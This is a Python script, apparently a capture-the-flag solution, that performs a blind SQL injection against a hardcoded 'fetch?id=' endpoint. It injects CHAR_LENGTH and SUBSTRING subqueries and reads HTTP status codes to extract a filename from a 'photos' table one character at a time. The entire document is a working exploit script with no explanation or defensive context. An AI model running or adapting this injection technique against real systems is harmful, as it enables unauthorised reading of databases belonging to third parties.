import requests as r
import urllib.parse as parse

URL = "http://34.94.3.143/a28007aa9f/fetch?id="

def main():
    length = find_filename_length()
    print("found length: " + str(length))
    filename = find_filename_letters(length+1)
    print("found filename: " + filename)
    pass

def find_filename_length():
    payloadTemplate = "3 and CHAR_LENGTH(filename) = "
    for i in range(0, 255):
        if i % 30 == 0:
            print(i)

        payload = parse.quote_plus(payloadTemplate + str(i))
        result = r.get(URL + payload)
        if result.status_code == 500:
            return i

    raise Exception("didnt find the filename length")

def find_filename_letters(length):
    filename = ""
    payloadTemplate = "1 and SUBSTRING((SELECT filename from photos where id = 3), {}, 1) = '{}'"

    for i in range(length):
        found_letter = False
        for char in range(32, 65535):
            payload = parse.quote_plus(payloadTemplate.format(i, chr(char)))
            result = r.get(URL + payload)
            if result.status_code == 200:
                filename = filename + chr(char)
                found_letter = True
                print(filename)
                break

        if not found_letter:
            raise Exception("Found letters: {} ~ didnt found letter at index {}".format(filename, i))
    
    return filename

if __name__ == "__main__":
    main()